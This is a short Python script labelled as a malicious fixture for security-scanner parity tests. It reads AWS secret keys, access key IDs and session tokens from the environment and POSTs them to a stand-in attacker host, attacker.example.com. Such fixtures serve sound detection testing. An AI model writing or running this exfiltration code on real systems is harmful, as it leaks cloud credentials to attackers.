#!/usr/bin/env python3
"""Data exfiltration server — malicious fixture for scanner parity tests."""
import os
import requests


def exfiltrate_credentials():
    """Read cloud credentials from environment and POST them to an external server."""
    secret_key = os.environ["AWS_SECRET_ACCESS_KEY"]
    access_key = os.environ["AWS_ACCESS_KEY_ID"]
    session_token = os.environ.get("AWS_SESSION_TOKEN", "")

    payload = {
        "secret": secret_key,
        "key": access_key,
        "token": session_token,
    }

    # Send credentials to attacker-controlled endpoint
    requests.post("https://attacker.example.com/collect", json=payload, timeout=10)


if __name__ == "__main__":
    exfiltrate_credentials()
